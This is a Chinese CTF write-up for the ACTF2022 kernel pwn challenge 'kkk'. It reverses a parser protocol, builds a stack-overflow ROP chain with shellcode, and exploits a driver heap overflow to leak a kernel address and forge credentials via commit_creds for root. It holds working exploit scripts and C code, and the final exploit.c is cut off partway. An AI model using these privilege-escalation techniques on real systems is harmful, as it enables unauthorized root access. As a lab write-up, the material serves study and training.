# ACTF2022 kkk 赛后复现



{{< admonition info >}}
Yet another signin (kernel) pwn challenge. **4 Solved**
{{< /admonition >}}

感谢 Nu1L 和 AAA 的几位师傅分享思路。

<!--more-->


## Preparation

不知道怎么调 qemu-system 内跑的用户态程序。明明 qemu-system 不像 qemu-user 一样与 elf 公用同一片内存，但不知道为什么 parser 加载地址对不上。

> 建议 host 调试,不然只能下绝对地址断点。

尝试直接在 host 里调。kkk.ko 与本机 kernel 版本不同，不能直接挂上来。所以自己造一个 fake module

```c
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/ioctl.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <linux/types.h>
#include <linux/crypto.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/mutex.h>
#include <linux/spinlock.h>

#include <linux/scatterlist.h>

// #define DEBUG

/* ioctl commands */
#define KKK_IOCTL_ADD _IO('k', 100)
#define KKK_IOCTL_UPDATE _IO('k', 103)
#define KKK_IOCTL_DUMP _IO('k', 105)
#define KKK_IOCTL_LAUNCH _IO('k', 107)
#define KKK_IOCTL_DETACH _IO('k', 109)



/* empty handler, we just need ioctl */
static int
kkk_open(struct inode *inodep, struct file *filp)
{
    printk("kkk_open()\n");
    

    return 0;
}

static int kkk_close(struct inode *inodep, struct file *filp)
{
    printk("kkk_close()\n");

    return 0;
}

static ssize_t kkk_write(struct file *file, const char __user *buf,
                         size_t len, loff_t *ppos)
{
    printk("kkk_write()\n");
    return len;
}

static ssize_t kkk_read(struct file *file, char __user *buf,
                        size_t len, loff_t *ppos)
{
    printk("kkk_read()\n");
    return len;
}

static long kkk_internal_ioctl(struct file *filp, unsigned int cmd, unsigned long value)
{
    printk("kkk_internal_ioctl()\n");

    switch(cmd)
    {
        case KKK_IOCTL_ADD:
        {
            printk("KKK_IOCTL_ADD\n");
            break;
        }
        case KKK_IOCTL_UPDATE:
        {
            printk("KKK_IOCTL_UPDATE\n");
            break;
        }
        case KKK_IOCTL_DUMP:
        {
            printk("KKK_IOCTL_DUMP\n");
            break;
        }
        case KKK_IOCTL_LAUNCH:
        {
            printk("KKK_IOCTL_LAUNCH\n");
            break;
        }
        case KKK_IOCTL_DETACH:
        {
            printk("KKK_IOCTL_DETACH\n");
            break;
        }
        default:
            printk("Wrong choice\n");
            break;
    }

    return 0;
}

static long kkk_unlocked_ioctl(struct file *file, unsigned int cmd, unsigned long value)
{
    return kkk_internal_ioctl(file, cmd, value);
}

static long kkk_compat_ioctl(struct file *file, unsigned int cmd, unsigned long value)
{
    return kkk_internal_ioctl(file, cmd, value);
}

static const struct file_operations kkk_fops = {
    .owner = THIS_MODULE,
    .write = kkk_write,
    .read = kkk_read,
    .open = kkk_open,
    .release = kkk_close,
    .unlocked_ioctl = kkk_unlocked_ioctl,
    .compat_ioctl = kkk_compat_ioctl,
    .llseek = no_llseek
};

struct miscdevice kkk_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "kkk",
    .fops = &kkk_fops,
};

static int __init kkk_init(void)
{
    int error;

    error = misc_register(&kkk_device);
    if (error)
    {
        pr_err("misc_register fail\n");
        return error;
    }

    return 0;
}

static void __exit kkk_exit(void)
{
    misc_deregister(&kkk_device);
}

module_init(kkk_init);
module_exit(kkk_exit);

MODULE_DESCRIPTION("kkk fake driver");
MODULE_AUTHOR("x1do0");
MODULE_LICENSE("GPL");
```

驱动的 Makefile 用最基础的就行。

```Makefile
ifneq ($(KERNELRELEASE),)
obj-m:=kkk.o
else
KDIR :=/lib/modules/$(shell uname -r)/build
PWD :=$(shell pwd)
all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	rm -f *.ko *.o *.mod.o *.symvers *.cmd *.mod.c *.order
endif
```

make 以后 insmod 挂上来就能跑 or 调试 parser 了。

进 su 以后 python 环境会变，添加 sys.path 才行，不然 pwntools 库都找不到，参考[这篇](https://askubuntu.com/questions/1268870/python-module-not-found-in-sudo-mode-ubuntu-20-04)。

进 su 以后直接在脚本里 gdb.attach 会挂不上 gdb，提示 ptrace not permitted。参考[这篇](https://stackoverflow.com/questions/19215177/how-to-solve-ptrace-operation-not-permitted-when-trying-to-attach-gdb-to-a-pro)，尝试过改 `/proc/sys/kernel/yama/ptrace_scope` 也不行。。

只有先跑脚本，再开一个 su，然后 gdb attach pid 挂上去。。在 exp 中写个等待用户输入。

```python
###
input() # wait for input, attach gdb at this time
###
```

然后乘机跑 `debug.sh [pid]`，挂上 gdb。

```bash
#!/bin/sh

gdb -q attach "$1" -ex 'b *0x401B22'
```

然后就能调了。。实际上 parser 还开了 sandbox，在 `prepare` 中。如果可以顺利跑起来的话直接 `seccomp dump` 也能发现。

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
 0005: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0014
 0006: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0014
 0007: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0014
 0008: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0014
 0009: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0014
 0010: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0014
 0011: 0x15 0x02 0x00 0x0000000b  if (A == munmap) goto 0014
 0012: 0x15 0x01 0x00 0x00000010  if (A == ioctl) goto 0014
 0013: 0x06 0x00 0x00 0x00050005  return ERRNO(5)
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0015: 0x06 0x00 0x00 0x00000000  return KILL
```

当然，其实直接先把用到 kkk.ko 的全部 patch 掉也行。

## step1 

在这一部分，我们会攻破用户态程序 parser，拿到 shell or 实现任意代码执行。

### 协议逆向

对协议进行逆向，结果大概是这个样子

#### packet_hdr

头部 0x30 字节，程序用 `get_packet_hdr` 来赋值。它包含了这些信息和要求

* `packet_hdr[:4]` 需要是 `p32(0xAAA)`
* `packet_hdr[4:8]` 需要是 `p32(1)`
* `packet_hdr[16:20]` 是 size 域，`size > 0x877` 则报错
* `packet_hdr[20:24]` 是校验和，会过一个 crc32

#### segment_hdr

紧跟着是一个 0x8 字节的头部，赋值在 `get_segements` 函数中。它包含了这些信息

* `segment_hdr[:4]` 标识了后续 segment 的段数 cnt，`cnt > 7` or `cnt <= 1` 则报错
* `segment_hdr[4:8]` 是另一个大小域 size2，`size2 + 0x38 > size` 则报错

#### segment

然后就是 cnt 个 segment，每个 segment 包含了这些信息

* `segment[4:8]` 是这个 segment 内容的大小域 con_size，`con_size > 0x100` 则报错。它会过一个 0x20 字节向上对齐的操作。
* `segment[8:]` 是用户随意输入的内容，大小为 con_size

### demo

CRC的值其实可以每次调试拿到，比如这里的 `0x796f15c9`。可以试一下这个 demo exp

```python
io = process("./parser")

# input()
# gdb.attach(io, "b *0x401B22")

io.recvuntil("ENTER YOUR PACKET > ")

### pakcet_hdr 0 - 0x30

packet_hdr = p32(0xAAA) + p32(1)
packet_hdr += p64(0)
packet_hdr += p32(0x877) # a1[4]
packet_hdr += p32(0x796f15c9) # crc32
packet_hdr = packet_hdr.ljust(0x30, b'\x00')


SEND(io, packet_hdr)

### segment_hdr 0x30 - 0x38

cnt = 2
segment_hdr = p32(cnt) + p32(0) # a1[:30]

SEND(io, segment_hdr)

### segment 0x38 - 

for i in range(cnt):

    ### header 8 bytes
    size = 0x100
    segment = p32(0) + p32(size)
    SEND(io, segment) 

    ### content size bytes
    content = b'a'*0x100
    SEND(io, content)


io.interactive()
```

可以看到确实和 kkk.ko 交互了，交互顺序与程序一致。证明协议逆向没什么问题。

```bash
root@x1do0:/home/x1do0/linux_share/actf/kkk# dmesg -c
[61111.167379] kkk_open()
[61111.173754] kkk_internal_ioctl()
[61111.173754] KKK_IOCTL_ADD
[61111.173755] kkk_internal_ioctl()
[61111.173755] KKK_IOCTL_LAUNCH
[61111.173756] kkk_internal_ioctl()
[61111.173756] KKK_IOCTL_DUMP
[61111.173766] kkk_internal_ioctl()
[61111.173769] KKK_IOCTL_DETACH
[61116.897292] kkk_close()
```

```c
for ( i = 1; ; ++i )
  {
    result = i;
    if ( *v11 <= i )
      break;
    next_type = *next_ptr;
    next_size = align(next_ptr[1]);
    next_con = size_shift((__int64)next_ptr, 8u);
    cur_size = align(*(unsigned int *)(v10 + 4));
    cur_con = size_shift(v10, 8u);
    add(cur_con, cur_size, next_con, next_size, next_type);// 0x6B64 add
    launch(i - 1);                              // 0x6B6B Launch
    next_con_2 = size_shift((__int64)next_ptr, 8u);
    cur_con_2 = size_shift(v10, 8u);
    show(i - 1, cur_con_2, next_con_2);         // 0x6B69 Dump
    release(i - 1);                             // 0x6b6D detach
  }
```

### 漏洞

在 `get_segements` 中读取 segment 内容的大小域时，只需要 int 值不大于 0x100 就行了。但是在后续读取以及 `parse_and_run` 解析时会把这个域 解析成 unsigned int。所以如果一开始 size 赋值为负数，它能绕过检测，并且在后续解析成一个巨大的 unsigned int 造成溢出。

```c

unsigned int v2;
__int64 v4; // [rsp+220h] [rbp-40h]


for ( i = 0; i < v5; ++i )
  {
    v4 = size_shift((__int64)v6, v8 + 8);
    read_through_base64(v4, 8u);
    if ( *(int *)(v4 + 4) > 0x100 )
      return 0xFFFFFFFFLL;
    // ...  

    v2 = *(_DWORD *)(v4 + 4);
    v3 = size_shift(v4, 8u);
    read_through_base64(v3, v2);    // int -> unsigned int

    //...

```

### 利用

于是可以在 `main` 中 `v4` 变量造成栈溢出，没开 canary。实际上如果 cnt 为 1，它虽然不会走到 `parse_and_run` 但是已经导致了栈溢出。当然，输入多个 segment 也行。

PoC 如下。至此，我们达到了用户态任意代码执行的目标。

```python

import base64
import sys

sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages')
sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg')

print(sys.path)


from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

def SEND(io, con):
    io.send(base64.b64encode(con))


io = process("./parser")

# input()
# gdb.attach(io, "b *0x401B22")

for i in range(15):
    io.sendafter("ENTER YOUR PACKET > ", '\n')

io.recvuntil("ENTER YOUR PACKET > ")

### pakcet_hdr 0 - 0x30

packet_hdr = p32(0xAAA) + p32(1)
packet_hdr += p64(0)
packet_hdr += p32(0x877) # a1[4]
packet_hdr += p32(0x796f15c9) # crc32
packet_hdr = packet_hdr.ljust(0x30, b'\x00')


SEND(io, packet_hdr)

### segment_hdr 0x30 - 0x38

cnt = 1
segment_hdr = p32(cnt) + p32(0) # a1[:30]

SEND(io, segment_hdr)

### segment 0x38 - 


### header 8 bytes
size = 0xf0000000
segment = p32(0) + p32(size)
SEND(io, segment) 

### content size bytes

# 0x00000000004006a6 : pop rdi ; ret
# 0x000000000045c139 : pop rdx ; pop rsi ; ret
# 0x00000000004005af : pop rax ; ret
# 0x00000000004859c5 : syscall ; ret


# mprotect(buf, 0x1000, 4|2|1)

buf_addr = 0x6DB4A0

rop = flat(0x00000000004006a6, buf_addr&(~0xfff),
        0x000000000045c139, 7, 0x1000,
        0x00000000004005af, 10,
        0x00000000004859c5)

# read(0, buf, 0x100)

rop += flat(0x00000000004006a6, 0,
        0x000000000045c139, 0x100, buf_addr,
        0x00000000004005af, 0,
        0x00000000004859c5)

# ret2shellcode

rop += p64(buf_addr)

content = b'a'*0x848 + rop
SEND(io, content)



shellcode = asm(shellcraft.open("flag"))
shellcode += asm(shellcraft.read('rax', buf_addr+0x200, 0x20))
shellcode += asm(shellcraft.write(1, buf_addr+0x200, 0x20))

io.sendline(shellcode)

# 0x7ffdbdb52b80
# return at 0x7ffdbdb533c8


io.interactive()

```

## step2

到现在为止，我们实现了任意代码执行，可以和 kkk.ko 驱动随意交互。在这一部分，我们将攻破内核态驱动，拿到 root 权限。

### 驱动逆向

对着 kkk.ko 看，可以明确协议的更多域，比如：

* `segment[1]` 是 enc

* `segment[2]` 是 kkk_type，enum 型，标识了 kkk.ko 处理的加密方案。

但再去看这个协议并没有多少意义，因为我们已经可以直接用 `ioctl` 去和驱动交互了。有以下这些交互选项

#### open 

初始化，把 filep 的 private_data 赋值成自建的结构体 `kkk_desc`，这个结构体里有个 `kkk_obj` 指针数组

#### close

退出，释放、清零指针。

#### 0x6B64 add 

这里 `add` 送入的参数 con 是以结构体 `kkk_ioctl_add_arg` 形式，有如下域

```c
struct kkk_ioctl_add_arg
{
    enum kkk_type type;
    int enc;
    struct kkk_pack key;
    struct kkk_pack data;
};

/* core data strcutres */
struct kkk_pack
{
    unsigned int size;
    void *ptr; // user space pointer
};
```

在 `add` 操作中，会找到 filep 的 private_data，选最小 idx 的 `kkk_obj` 指针数组来分配。分配方式很简单，为该指针分配 `kkk_obj` 结构体大小加上 `keypack->size` 与 `datapack->size` 大小的空间。以参数 con 各个域来填充该  `kkk_obj` 结构体，同时会把 `keypack->ptr` 与 `datapack->ptr` 具体内容拷贝到后方区域。其中 `handler` 是 `type` 指定的加密算法的函数指针。

```c
struct kkk_obj
{
    struct kkk_pack keypack;
    struct kkk_pack datapack;
    int id;
    int enc;
    int (*handler)(struct kkk_obj *);
};
```

#### 0x6B67 update

`update` 送入参数 con 是以结构体 `kkk_ioctl_other_arg` 形式，有如下域

```c
struct kkk_ioctl_other_arg
{
    int id;
    struct kkk_pack key;
    struct kkk_pack data;
};
```

在 `update` 操作中，会根据 con 的内容修改 `kkk_obj[id]` 对应的 `keypack->ptr` 与 `datapack->ptr` 内容（不能改 size）。

#### 0x6B69 dump

`dump` 送入参数 con 也是以结构体 `kkk_ioctl_other_arg` 形式。它会将 `kkk_obj[id]` 对应的 `keypack->ptr` 与 `datapack->ptr` 内容覆盖到 con 的 `keypack->ptr` 与 `datapack->ptr` 指针所指内容中。（size 域同样无效）

#### 0x6B6B launch

传入参数同样是以结构体 `kkk_ioctl_other_arg` 形式。会执行 `kkk_obj[id]->handler(kkk_obj[id])`

#### 0x6B6D detach

参数同样是以结构体 `kkk_ioctl_other_arg` 形式。会 `kfree(kkk_obj[id])` 并清零指针。 

### 加密函数

上述交互看上去并没有什么问题，`detach` 里没有 uaf，`update` 和 `dump` 因为 size 域根本无效所以也没有越界。所以来接着看看 `handler` 指向的各个加密函数。具体来说，`handler` 是根据 `type` 如下赋值的，可见一共有 4 中加密方式。

```
// add 功能中
handler = handlers[type & 3];

.data:00000000000011E0 handlers        dq offset kkk_des_cb    ; DATA XREF: kkk_unlocked_ioctl+1E0↑r
.data:00000000000011E8                 dq offset kkk_tdes_cb
.data:00000000000011F0                 dq offset kkk_aes128_cb
.data:00000000000011F8                 dq offset kkk_aes256_cb
```

这 4 种加密函数做的事都是把 `obj->keypack.ptr` 的前八个字节作为 key 去进行加密 `obj->datapack.ptr` ，会调用函数 `enc_dec_internal` ，其中 `size` 由 `obj->datapack.size` 指定。可以看到它的操作是按 `blocksize` 去逐块加密，但我们注意到它并没有进行对齐操作。

```c
static void
enc_dec_internal(struct crypto_cipher *tfm, char *buf, size_t size,
                 char *block1, char *block2, size_t blocksize, int enc)
{
    int i;
    for (i = 0; i < size; i += blocksize)
    {
        memcpy(block1, buf + i, blocksize);
        /* code */
        if (enc)
        {
            crypto_cipher_encrypt_one(tfm, block2, block1);
        }
        else
        {
            crypto_cipher_decrypt_one(tfm, block2, block1);
        }
        memcpy(buf + i, block2, blocksize);
    }
}
```

漏洞就出现在这里。 `kkk_aes256_cb` 和 `kkk_aes128_cb` 中，这两个加密函数指定的 `blocksize` 均为 16，但是由于 `obj->datapack.size` 并没有做 16 字节对齐操作，将可能导致内核堆溢出。`kkk_des_cb` 与 `kkk_tdes_cb` 也同理，它也没有保证其 8 字节对齐。 

### 测试

尝试修改 kernel 启动的 init 脚本，对 kkk.ko 单独进行测试。将 `/parser` 启动命令改成 `/bin/sh` 即可。

```bash
#!/bin/sh

mkdir tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp

exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"

insmod /kkk.ko
chmod 666 /dev/kkk
chmod 740 /flag
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

poweroff -d 600 -f &



# setsid /bin/cttyhack setuidgid 1000 /parser
setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d 0  -f
```

堆溢出 PoC 如下，将它静态编译放入文件系统即可。

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

struct AddParam{
    unsigned long long type; // type and enc
    unsigned long long key_len;
    char * key;
    unsigned long long data_len;
    char * data;   
};

struct OtherParam{
    unsigned long long id;
    unsigned long long key_len;
    char * key;
    unsigned long long data_len;
    char * data;     
};

void Add(int fd, struct AddParam* p)
{
    printf("[+] Add return :%d\n", ioctl(fd, 0x6B64, p));
}

void Run(int fd, struct OtherParam* p)
{    
    printf("[+] Launch return :%d\n", ioctl(fd, 0x6B6B, p));
}

void Detach(int fd, struct OtherParam* p)
{
    ioctl(fd, 0x6B6D, p);
}

void main()
{
    char path[0x10] = "/dev/kkk";
    char buf[0x100];
    
    memset(buf, 0, 0x100);

    int fd = open(path, 0);
    if(fd == -1){
        puts("[!] open wrong, exit");
        exit(0);
    }

    struct AddParam a;
    struct OtherParam r;

    // malloc 192 - 48 = 144 = 0x90

    a.type = 3;
    a.key_len = 0x7F;
    a.key = buf;
    a.data_len = 0x11;
    a.data = buf + 0x80;
    memset(buf, 0x41, 8);

    Add(fd, &a);

    a.type = 3;
    a.key_len = 0x80;
    a.key = buf;
    a.data_len = 0x10;
    a.data = buf + 0x80;
    memset(buf, 0x42, 8);

    Add(fd, &a);

    // memset(buf, 0x43, 8);
    // Add(fd, &a);

    r.id = 0;
    Run(fd, &r);

    return;
}


// 0xffff98df82d7ccc0

// 0xffff98df82d7cd80


```

当 add 分配时，会调用 `kmalloc(obj->datapack.size + obj->keypack.size + 48)`，我们将它分配的堆块全部控制在 `kmalloc-192` 这个 SLUB 中，并使它们地址连续（如果不连续就多分配几个，直到连续）。这个 PoC 的逻辑是：让 SLUB 分配两个地址连续的 `kmalloc-192` 堆块，其 id 分别是 0 和 1，通过 `Run()` 触发对 `id=0` 的堆块的 `kkk_aes256_cb` 加密。通过加密前，堆块内容如下

![](https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png)

通过加密后，由于对齐原因造成堆溢出，覆盖了相邻下方 `id=1` 堆块的 `keypack.size` 与 `keypack.ptr` 区域。

![](https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png)


### 利用

堆溢出之后我们可以修改 `keypack.size` 与 `keypack.ptr` 区域，配合 `update` 与 `dump` 功能，实际上就可以做到内核区域任意地址读写。但堆上只有 SLUB 地址和 kkk.ko 的地址，内核代码段地址不得而知。很自然想到的一个方式是：修改 `fork` 出来的子进程的 `cred` 结构体。

#### fork & zero `cred`

[SLUB 分配规则](https://xidoo.top/2021/08/slab_buddy_system0/#birds-eye-view)比较简单，这里只需要注意三点：

1.  `cred` 结构体大小进的是 `kmalloc-192` 这个 SLUB
2. 不同大小的 SLUB 分配地址相差十万八千里
3. 由于 `kmalloc-192` 的初始分配情况未知，可能出现分配时一个 `partial` 链用完了换了另一个等情况，导致连续分配的两个 SLUB 地址也不相邻，所以得多调一下避免这种情况的发生。

所以我们的思路就是让一个 `kmalloc-192` 溢出，覆盖后一个 `kmalloc-192` 的域，再利用程序逻辑越界写在后面跟着的 `cred` 结构体的 `kmalloc-192`，清零 uid 位拿到 root 权限。本来应该是可以的，但我做到一半突然意识到忘了 sandbox 这回事了。。因为这题不能直接打内核，还是得从 parser 开始打，拿不到 shell 导致还是得在 parser 程序中用 sandbox 允许的系统调用来提权，sandbox 里不让 `fork` ...

又想到 tty 结构体，如果能在 SLUB 中分配一个 tty 结构体就好了，说不定里面由一些内核代码段的地址。但是 `open("/dev/ptmx")` 总是返回 `errno=2` ，这个文件明明是有的，但是 `cat` 提示 No such file or directory。[查了一下](https://blog.csdn.net/yongbaoii/article/details/123924737)好像是 kernel 启动脚本的问题，靶机上也没法改启动脚本啊...遂作罢。

有一篇[文章](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)总结了一下常用的结构体，但是日文翻译之后我都看不太懂...找到了相似的另一份[中文资料](https://kagehutatsu.com/?p=442)，也没找到适合大小的结构体。

#### 爆破内核代码段地址

其实拿到内核代码段地址就好办了，当我们拿到 `commit_creds` 地址之后只需要把堆上的加密函数指针覆盖成 `commit_creds` 就行，并且在堆上伪造一个 `init_creds`，触发加密逻辑即可拿到 root 权限，然后 orw 读 flag。这是 [Nu1L 战队题解](https://mp.weixin.qq.com/s/mF339elDBtjw1PCdBcXxxw)的思路。

虽然内核代码段只有 12 个 bits 在改变，但是这题开了 kaslr 吧...exp 地址正确的概率不是只有 1/2^12 吗 ...

> 但是怎么泄露内核地址呢? 越界读只能泄露kkk.ko的地址, 也没法ROP, 想了很久, 最终解决⽅法是: 爆破. 因为内核基地址的熵很⼩, 只有24bit, ⽽且实测发现⼤多数情况都是0x1F800000, 0x21100000这样⽐较⼩的数字, 因此爆破花不了多⻓时间的.

感觉概率也挺低吧... Nu1L 的师傅说爆了一个多小时。

#### 泄露内核代码段地址

拿到内核代码段地址还有另一种办法。我们现在通过覆盖 `keypack.size` 可以进行越界读写，篡改后一个堆块的大小和指针域就能实现真正意义上的任意地址读写。我们可以很轻易的拿到 SLUB 地址和 kkk.ko 的加载地址（越界读拿到 `handler` 函数地址）现在的问题就是能不能在 SLUB 段或是 kkk.ko 段找到一个有 kernel 段代码地址的地方呢？

实际上是有的，由于 kkk.ko 的 fops 没有都被驱动实现（实现了就在 kkk.ko，没实现就用 kernel 原本的），所以在 fops 中可以找到 kernel 地址。[X1cT34m 战队](https://ctf.njupt.edu.cn/752.html#kkk) 与出题人大哥泄露 kernel 地址的思路都是如此。

```
/ # cat /proc/kallsyms | grep kkk
ffffffffc0000000 t kkk_write    [kkk]
ffffffffc0000010 t enc_dec_internal     [kkk]
ffffffffc0000130 t kkk_aes256_cb        [kkk]
ffffffffc0000290 t kkk_aes128_cb        [kkk]
ffffffffc00003d0 t kkk_tdes_cb  [kkk]
ffffffffc0000510 t kkk_des_cb   [kkk]
ffffffffc0000620 t kkk_close    [kkk]
ffffffffc0000670 t kkk_open     [kkk]
ffffffffc00006b0 t kkk_read     [kkk]
ffffffffc00006c0 t kkk_unlocked_ioctl   [kkk]
ffffffffc00009f0 t kkk_compat_ioctl     [kkk]
ffffffffc00009f5 t kkk_exit     [kkk]
ffffffffc0001180 r kkk_fops     [kkk]   # !!!
ffffffffc000109f r .LC12        [kkk]
ffffffffc0001694 r _note_9      [kkk]
ffffffffc00016ac r _note_8      [kkk]
ffffffffc00020c0 d __this_module        [kkk]
ffffffffc00009f5 t cleanup_module       [kkk]
ffffffffc0002060 d handlers     [kkk]
ffffffffc0002000 d kkk_device   [kkk]

pwndbg> x/10xg  0xffffffffc0001180
0xffffffffc0001180:     0xffffffffc00020c0      0xffffffff812258e0
0xffffffffc0001190:     0xffffffffc00006b0      0xffffffffc0000000
0xffffffffc00011a0:     0x0000000000000000      0x0000000000000000
0xffffffffc00011b0:     0x0000000000000000      0x0000000000000000
0xffffffffc00011c0:     0x0000000000000000      0x0000000000000000
```

#### privilege escalation

拿到 kernel 地址就好办啦，这里我们也有三种方法

* Nu1L: 修改加密 `handler` 为 `commit_creds` ，在当前块伪造一个 `init_cred` ，触发加密即可。无需跳回用户态。

* X1cT34m & AAA（出题人大哥）：找 gadget 把栈迁移到 SLUB 上做 ROP，做完需要圆润地返回用户态。

* [影二つ的博客](https://kagehutatsu.com/?p=696)：通过 `init_task` 结构体，遍历全部的 `task_struct`，找到当前进程的 `cred` ，清零 PID 便能拿到 root 权限。无需跳回用户态。

* 当然，找到当前 `task_struct` 之后，也可以直接把 `cred` 结构体指针改成 `init_cred`。

笔者一开始复现时采用了第一种方法，因为它看上去是最自然的。`init_cred` 有这些结构，一般来说它被赋予的值见[这篇文章](https://cloudfuzz.github.io/android-kernel-exploitation/chapters/linux-privilege-escalation.html#process-credentials).

```c
/*
 * The initial credentials for the initial task
 */
struct cred init_cred = {
        .usage                  = ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
        .subscribers            = ATOMIC_INIT(2),
        .magic                  = CRED_MAGIC,
#endif
        .uid                    = GLOBAL_ROOT_UID,
        .gid                    = GLOBAL_ROOT_GID,
        .suid                   = GLOBAL_ROOT_UID,
        .sgid                   = GLOBAL_ROOT_GID,
        .euid                   = GLOBAL_ROOT_UID,
        .egid                   = GLOBAL_ROOT_GID,
        .fsuid                  = GLOBAL_ROOT_UID,
        .fsgid                  = GLOBAL_ROOT_GID,
        .securebits             = SECUREBITS_DEFAULT,
        .cap_inheritable        = CAP_EMPTY_SET,
        .cap_permitted          = CAP_FULL_SET,
        .cap_effective          = CAP_FULL_SET,
        .cap_bset               = CAP_FULL_SET,
        .user                   = INIT_USER,
        .user_ns                = &init_user_ns,
        .group_info             = &init_groups,
};
```

看上去只要 `.usage = 4`，其他的全 0 就完事了。但实际上并不是。经过测试在 `ptr[15]` 处需要填充一处可读写的地址（填 SLUB 地址就行），这样就可以成功执行 `commit_creds` 拿到 root 权限。Nu1L 题解这样就行，但是我复现的时候发现后续 `open("/flag")` 再次 syscall read 的时候会出现段错误，错误现场能推测出是 `cred` 结构体伪造有误。最后经过反复尝试发现 `ptr[17]` 处需要和 `init_cred` 该处的值保持一致，这个值在 kernel 的某个数据段，和 kernel 代码段偏移貌似是有概率不变的。

```c
    ptr[0] = 4;
    ptr[1] = 0;
    ptr[2] = 0;
    ptr[3] = 0;
    ptr[4] = 0;
    ptr[5] = commit_creds;

    ptr[6] = 0x1FFFFFFFFF;
    ptr[7] = 0x1FFFFFFFFF;
    ptr[8] = 0x1FFFFFFFFF;

    ptr[15] = slub_addr;
    // ptr[16] = 0xffffffff8284ef80;
    // ptr[17] = 0xffffffff8284f020;
    ptr[17] = commit_creds - 0xffffffff8109bcf0 + 0xffffffff8284f020;
    // ptr[18] = 0xffffffff82850e20;
    // ptr[19] = 0xffffffff82850610;
```

认为这个地址和代码段偏移不变的话，最终写出如下 exploit.c，实测是有很大概率可以打通的。

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>

struct AddParam{
    unsigned long long type; // type and enc
    unsigned long long key_len;
    char * key;
    unsigned long long data_len;
    char * data;   
};

struct OtherParam{
    unsigned long long id;
    unsigned long long key_len;
    char * key;
    unsigned long long data_len;
    char * data;     
};

void Add(int fd, struct AddParam* p)
{
    printf("[+] Add return :%d\n", ioctl(fd, 0x6B64, p));
}

void Run(int fd, struct OtherParam* p)
{    
    printf("[+] Launch return :%d\n", ioctl(fd, 0x6B6B, p));
}

void Update(int fd, struct OtherParam* p)
{
    printf("[+] Update return :%d\n", ioctl(fd, 0x6B67, p));
}

void Dump(int fd, struct OtherParam* p)
{
    printf("[+] Dump return :%d\n", ioctl(fd, 0x6B69, p));    
}

void Detach(int fd, struct OtherParam* p)
{
    ioctl(fd, 0x6B6D, p);
}

void main()
{
    char path[0x10] = "/dev/kkk";
    char buf[0x100];
    char sendbuf[0x100];
    char recvbuf[0x10000];
    
    printf("[+] Current UID: %d\n", getuid());
    memset(buf, 0, 0x100);

    int fd = open(path, 0);
    if(fd == -1){
        puts("[-] open wrong, exit");
        exit(0);
    }

    struct AddParam a;
    struct OtherParam r;

    // malloc 1024 - 48 = 0x3D0

    a.type = 0;
    a.key_len = 0x7a;
    a.key = buf;
    a.data_len = 0x16;  // overflow 2 bits of the key size
    a.data = buf + 0x80;
    memset(buf, 0x42, 1);

    Add(fd, &a);

    a.type = 3;
    a.key_len = 0x80;
    a.key = buf;
    a.data_len = 0x10;
    a.data = buf + 0x80;
    memset(buf, 0x42, 8);

    Add(fd, &a);

    memset(buf, 0x43, 8);
    Add(fd, &a);


    r.id = 0;
    Run(fd, &r);  // trigger overflow

    r.id = 1;
    r.data = sendbuf;
    r.key = recvbuf;
    Dump(fd, &r);   // chunk 1 OOB read, read chunk 2

    uint64_t slub_addr = *(uint64_t *)(recvbuf + 0x98);  // 0xffff888005318b70
    uint64_t kkk_addr = *(uint64_t *)(recvbuf + 0xb8);   // 0xffffffffc0000130

    uint64_t kkk_fops = 0xffffffffc0001180ul + kkk_addr - 0xffffffffc0000130ul;

    printf("[+] slub_addr: 0x%lx\n", slub_addr);
    printf("[+] kkk_addr: 0x%lx\n", kkk_addr);
    printf("[+] kkk_fops: 0x%lx\n", kkk_fops);


    *(uint64_t *)(recvbuf + 0x90) = 0x80;   // key_len
    *(uint64_t *)(recvbuf + 0x98) = slub_addr;   // key_buf
    *(uint64_t *)(recvbuf + 0xa0) = 0x50;   // data_len
    *(uint64_t *)(recvbuf + 0xa8) = kkk_fops;   // data_buf    
    Update(fd, &r);  // chunk 1 OOB write, write chunk 2 

    r.id = 2;   
